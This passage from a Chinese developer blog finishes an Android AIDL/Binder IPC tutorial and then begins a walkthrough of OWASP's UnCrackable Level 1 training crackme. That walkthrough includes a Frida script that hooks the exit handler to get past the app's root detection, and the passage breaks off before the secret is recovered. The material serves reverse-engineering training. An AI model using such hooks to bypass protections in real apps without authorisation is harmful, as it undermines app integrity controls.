intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyServiceimpl();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyServiceimpl</span> <span class="keyword">extends</span> <span class="title">IMyService</span>.<span class="title">Stub</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Student <span class="title">getStudent</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            Student st = <span class="keyword">new</span> Student();</span><br><span class="line">            st.setAge(<span class="number">18</span>);</span><br><span class="line">            st.setName(<span class="string">&quot;terry&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> st;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Map <span class="title">getMap</span><span class="params">(String testClass, Student student)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;五年级&quot;</span>);</span><br><span class="line">            map.put(<span class="string">&quot;age&quot;</span>, student.getAge());</span><br><span class="line">            map.put(<span class="string">&quot;name&quot;</span>, student.getName());</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续看接口类，在<code>Stub</code>中实现了一个很重要的方法<code>asInterface(android.os.IBinder obj)</code>。该方法会查询是否有一个<code>IMySerivce</code>的实例，其实是查询是不是在同一个应用中调用它，那就不用实行远程调用，直接本地调用即可。如果不是本地接口，这时会返回一个<code>Proxy</code>对象。<code>Proxy</code>类是<code>Stub</code>的一个内部类，同样实现了<code>IMyService</code>接口。但它却实现了这些接口方法。这就意味着如果要进行远程调用，必须获取一个<code>Proxy</code>类的实例，方法是通过<code>Stub</code>类的<code>asInterface()</code>获得，具体实现一会可以在客户端中看到。</p>
<h3 id="客户端程序实现"><a href="#客户端程序实现" class="headerlink" title="客户端程序实现"></a>客户端程序实现</h3><p>客户端程序的目录结构如下：<br><img src="/images/binder/client.png"><br>首先需要将服务端的aidl文件夹拷贝过来，Student类也要拷贝过来，而且包名不能变。接着编写MainActivity类：    </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    Button btn1, btn2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IMyService myService = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> ServiceConnection serviceConnection = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            myService = IMyService.Stub.asInterface(service); <span class="comment">// 获取Proxy类的实例</span></span><br><span class="line">            btn2.setEnabled(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line">            myService = <span class="keyword">null</span>;</span><br><span class="line">            btn2.setEnabled(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        btn1 = (Button) findViewById(R.id.Button01);</span><br><span class="line">        btn2 = (Button) findViewById(R.id.Button02);</span><br><span class="line">        btn2.setEnabled(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        btn1.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        btn2.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.Button01:</span><br><span class="line">                bindService(<span class="keyword">new</span> Intent(<span class="string">&quot;com.example.aidlserver.IMyService&quot;</span>),</span><br><span class="line">                        serviceConnection, Context.BIND_AUTO_CREATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.Button02:</span><br><span class="line">                StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;学生名称为：&quot;</span> + myService.getStudent().getName() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    sb.append(<span class="string">&quot;年龄为：&quot;</span> + myService.getStudent().getAge() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    sb.append(<span class="string">&quot;map 对象内容为如下：&quot;</span></span><br><span class="line">                            + myService.getMap(<span class="string">&quot;中国&quot;</span>, myService.getStudent())</span><br><span class="line">                            .toString());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>).setTitle(<span class="string">&quot;调用外部服务&quot;</span>)</span><br><span class="line">                        .setMessage(sb.toString()).setPositiveButton(</span><br><span class="line">                        android.R.string.ok, <span class="keyword">null</span>).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到在<code>serviceConnection</code>成员变量的声明中，<code>onServiceConnected()</code>调用<code>asInterface()</code>获取了Proxy类的远程实例，Proxy就是远端传递过来的Binder对象的本地的代理。<br><code>ServiceConnection</code>对象是<code>Button01</code>点击事件中为了绑定Service而调用的<code>bindService</code>方法的参数。bindService时，会调用<code>ActivityThread</code>的方法，并会传递一个<code>Binder</code>引用，而<code>ActivityThread</code>会回调<code>ServiceConnection</code>中的<code>onServiceConnected</code>方法，并将这个<code>Binder</code>对象传入，也就是<code>asInterface</code>的参数<code>service</code>。整个流程结束就获得了远程实例，保存到全局变量<code>myService</code>中，为调用远程方法做准备。<br>最后一步就是调用远程方法了，即Button02的点击事件。到这里就完成了开发工作，先启动服务端，再启动客户端：<br><img src="/images/binder/result.png"></p>
<h3 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h3><p>这里还需要回头分析一下数据传送和方法调用的一些过程。Proxy类中实现了getMap和getStudent方法，客户端可以通过Proxy调用它们，这个调用会被Proxy对象转换成可以用Parcel包装的基础数据类型，参数也被序列化写入一个数据包。一个int型code会被指派给transact，这个code用来标识方法名，因为Binder此时只允许传递int类型。这就需要客户端和远程服务端做好约定。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> java.util.<span class="function">Map <span class="title">getMap</span><span class="params">(java.lang.String test_class, com.example.aidlserver.Student student)</span> <span class="keyword">throws</span> android.os.RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">java.util.Map _result;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">_data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">_data.writeString(test_class);</span><br><span class="line"><span class="keyword">if</span> ((student!=<span class="keyword">null</span>)) &#123;</span><br><span class="line">_data.writeInt(<span class="number">1</span>);</span><br><span class="line">student.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_data.writeInt(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">mRemote.transact(Stub.TRANSACTION_getMap, _data, _reply, <span class="number">0</span>);</span><br><span class="line">_reply.readException();</span><br><span class="line">java.lang.ClassLoader cl = (java.lang.ClassLoader)<span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">_result = _reply.readHashMap(cl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">_reply.recycle();</span><br><span class="line">_data.recycle();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> com.example.aidlserver.<span class="function">Student <span class="title">getStudent</span><span class="params">()</span> <span class="keyword">throws</span> android.os.RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">com.example.aidlserver.Student _result;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">_data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">mRemote.transact(Stub.TRANSACTION_getStudent, _data, _reply, <span class="number">0</span>);</span><br><span class="line">_reply.readException();</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span>!=_reply.readInt())) &#123;</span><br><span class="line">_result = com.example.aidlserver.Student.CREATOR.createFromParcel(_reply);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_result = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">_reply.recycle();</span><br><span class="line">_data.recycle();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法首先通过obtain方法获取两个Parcel对象。调用writeInterfaceToken方法用来标识，以便服务端能够识别。然后写入参数，注意这个写入顺序和取出顺序必须是一致的。然后对传给Proxy的Binder对象调用了transact方法。Parcel对象通过jni接口传递到Binder的C++空间，最终传递到Binder驱动。Binder驱动会让客户端进程休眠，并且将传过来的Parcel数据从客户端进程映射到服务端进程。然后反向的传递，从binder驱动传递到C++中间层，再通过JNI传递到java层。此时服务端Stub类的ontransact方法会被调用。方法如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTransact</span><span class="params">(<span class="keyword">int</span> code, android.os.Parcel data, android.os.Parcel reply, <span class="keyword">int</span> flags)</span> <span class="keyword">throws</span> android.os.RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (code)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> INTERFACE_TRANSACTION:</span><br><span class="line">&#123;</span><br><span class="line">reply.writeString(DESCRIPTOR);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> TRANSACTION_getMap:</span><br><span class="line">&#123;</span><br><span class="line">data.enforceInterface(DESCRIPTOR);</span><br><span class="line">java.lang.String _arg0;</span><br><span class="line">_arg0 = data.readString();</span><br><span class="line">com.example.aidlserver.Student _arg1;</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span>!=data.readInt())) &#123;</span><br><span class="line">_arg1 = com.example.aidlserver.Student.CREATOR.createFromParcel(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_arg1 = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">java.util.Map _result = <span class="keyword">this</span>.getMap(_arg0, _arg1);</span><br><span class="line">reply.writeNoException();</span><br><span class="line">reply.writeMap(_result);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> TRANSACTION_getStudent:</span><br><span class="line">&#123;</span><br><span class="line">data.enforceInterface(DESCRIPTOR);</span><br><span class="line">com.example.aidlserver.Student _result = <span class="keyword">this</span>.getStudent();</span><br><span class="line">reply.writeNoException();</span><br><span class="line"><span class="keyword">if</span> ((_result!=<span class="keyword">null</span>)) &#123;</span><br><span class="line">reply.writeInt(<span class="number">1</span>);</span><br><span class="line">_result.writeToParcel(reply, android.os.Parcelable.PARCELABLE_WRITE_RETURN_VALUE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">reply.writeInt(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.onTransact(code, data, reply, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先通过对code的判断，执行对应方法的内容，对数据按顺序解包，读出参数。最终调用服务端Service的方法，并将返回值写入Parcel，传递给Binder驱动。Binder驱动重新唤醒客户端进程并把返回值传递给Proxy对象，并最后被解包并作为Proxy方法的返回值。<br>从这一个流程下来，我们可以知道aidl主要就帮助我们完成了包装数据和解包的过程，并调用了transact过程。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/notice520/article/details/8135600">http://blog.csdn.net/notice520/article/details/8135600</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/TerryBlog/archive/2010/08/24/1807605.html">http://www.cnblogs.com/TerryBlog/archive/2010/08/24/1807605.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/05/07/Frida%E8%A7%A3%E5%86%B3Android-Crackme1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/05/07/Frida%E8%A7%A3%E5%86%B3Android-Crackme1/" class="post-title-link" itemprop="url">Frida解决Android Crackme1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-05-07 10:06:11" itemprop="dateCreated datePublished" datetime="2017-05-07T10:06:11+08:00">2017-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>了解了<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/05/05/Frida%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">Frida基本使用方法</a>之后，下面对Frida进行一些实践。<br>首先下载<a target="_blank" rel="noopener" href="https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk">crackme1</a>，安装到模拟器上并运行：<br><img src="/images/frida/runcrackme.png"><br>点击OK就会退出程序。将APK用JEB打开，查看MainActivity类  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sg.vantagepoint.uncrackable1;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.AlertDialog$Builder;</span><br><span class="line"><span class="keyword">import</span> android.app.AlertDialog;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> sg.vantagepoint.a.c;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String arg5)</span> </span>&#123;</span><br><span class="line">        AlertDialog v0 = <span class="keyword">new</span> AlertDialog$Builder(((Context)<span class="keyword">this</span>)).create();</span><br><span class="line">        v0.setTitle(((CharSequence)arg5));</span><br><span class="line">        v0.setMessage(<span class="string">&quot;This in unacceptable. The app is now going to exit.&quot;</span>);</span><br><span class="line">        v0.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> b(<span class="keyword">this</span>));</span><br><span class="line">        v0.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">        v0.show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((c.a()) || (c.b()) || (c.c())) &#123;</span><br><span class="line">            <span class="keyword">this</span>.a(<span class="string">&quot;Root detected!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sg.vantagepoint.a.b.a(<span class="keyword">this</span>.getApplicationContext())) &#123;</span><br><span class="line">            <span class="keyword">this</span>.a(<span class="string">&quot;App is debuggable!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg2);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">2130903040</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">verify</span><span class="params">(View arg5)</span> </span>&#123;</span><br><span class="line">        String v0 = <span class="keyword">this</span>.findViewById(<span class="number">2131230720</span>).getText().toString();</span><br><span class="line">        AlertDialog v1 = <span class="keyword">new</span> AlertDialog$Builder(((Context)<span class="keyword">this</span>)).create();</span><br><span class="line">        <span class="keyword">if</span>(a.a(v0)) &#123;</span><br><span class="line">            v1.setTitle(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">            v1.setMessage(<span class="string">&quot;This is the correct secret.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            v1.setTitle(<span class="string">&quot;Nope...&quot;</span>);</span><br><span class="line">            v1.setMessage(<span class="string">&quot;That\&#x27;s not it. Try again.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v1.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> sg.vantagepoint.uncrackable1.c(<span class="keyword">this</span>));</span><br><span class="line">        v1.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序onCreate就会对设备的root权限进行检查，如果已root则退出。按照之前的思路是将APK用baksmali反汇编，修改代码来解决，现在采用Frida方式来进行解决。<br>查看<code>sg.vantagepoint.a.c</code>类，里面都是与root权限相关的检查。可以通过覆盖这些方法让它们返回false，但是用命令启动脚本：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l checkroot.js -f sg.vantagepoint.uncrackable1 --no-pause</span><br><span class="line">...</span><br><span class="line">Process terminated</span><br></pre></td></tr></table></figure>
<p>检测root权限的方法在代码注入之前就执行了，注入没有起到应有的作用。<br>另一种方法是，先启动应用程序，当检测到了root权限，hook MainActivity中对话框调用的方法：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String arg5)</span> </span>&#123;</span><br><span class="line">    AlertDialog v0 = <span class="keyword">new</span> AlertDialog$Builder(((Context)<span class="keyword">this</span>)).create();</span><br><span class="line">    v0.setTitle(((CharSequence)arg5));</span><br><span class="line">    v0.setMessage(<span class="string">&quot;This in unacceptable. The app is now going to exit.&quot;</span>);</span><br><span class="line">    v0.setButton(-<span class="number">3</span>, <span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> b(<span class="keyword">this</span>)); <span class="comment">// 对话框调用的方法</span></span><br><span class="line">    v0.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">    v0.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对话框方法的代码如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> <span class="keyword">implements</span> <span class="title">DialogInterface</span>$<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    b(MainActivity arg1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.a = arg1;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface arg2, <span class="keyword">int</span> arg3)</span> </span>&#123;</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>点击对话框的OK就会调用onClick里的<code>System.exit(0)</code>，退出程序。为了防止应用程序退出，hook这个onClick方法：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// uncrackable1.js</span></span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] Starting script&quot;</span>);</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        bClass = Java.use(<span class="string">&quot;sg.vantagepoint.uncrackable1.b&quot;</span>);</span><br><span class="line">        bClass.onClick.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] onClick called&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] onClick handler modified&quot;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这里将onClick方法重写为只打印消息不退出程序，打开应用，注入脚本：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l uncrackable1.js sg.vantagepoint.uncrackable1</span><br><span class="line">...</span><br><span class="line">[*] onClick handler modified</span><br></pre></td></tr></table></figure>
<p>注入需要几秒钟的时间，注入完成后点击OK，程序就不会退出了：<br><img src="/images/frida/modified.png"><br>下面就要找出需要的密码，即找到加密/解密例程以及结果和输入的对比。MainActivity中有一个<code>verify</code>函数，它调用了<code>sg.vantagepoint.uncrackable1.a</code>类的<code>a</code>方法：  </p>
